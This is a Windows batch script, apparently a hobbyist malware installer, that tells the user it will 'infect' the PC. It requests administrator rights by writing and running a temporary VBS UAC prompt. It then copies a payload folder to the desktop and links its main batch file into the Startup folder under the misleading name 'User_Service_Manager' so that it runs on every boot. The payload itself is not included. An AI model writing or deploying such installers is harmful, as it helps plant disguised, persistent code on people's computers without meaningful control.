@echo off

echo I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO THIS DEVICE
echo THIS WILL REQUIRE ADMINISTRATOR ACCESS!
echo IF YOU WOULD NOT LIKE TO INFECT YOUR PC,
echo EXIT OUT OF THIS APPLICATION!
echo.
echo IF YOU ARE SURE YOU WANT THIS FILE TO INFECT YOUR PC,
echo PRESS ANY KEY AND ALLOW ADMIN ACCESS
echo.
echo But as always, good luck! ;)
echo.
pause

:: BatchGotAdmin
:-------------------------------------

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    

SET mypath=%~dp0
cd /D %mypath:~0,-1%

:: Infect this machine with copy command to desktop (hidden)
:: Copy shortcut of that to startup
:: Restart for payload to run
echo.
echo Infecting machine in progress...

pause

echo "%~dp0payload\_main_payload.bat"
xcopy /S /I /H /W /P "%~dp0payload" "%userprofile%\Desktop\payload"

echo.
echo Initial payload copy --- Done!

pause

mklink "%userprofile%\Start Menu\Programs\Startup\User_Service_Manager" "%userprofile%\Desktop\payload\_main_payload.bat"


echo.
echo Copy to startup --- Done!

pause

echo.
echo Infection --- Complete!

echo.
echo Press any key to exit.
pause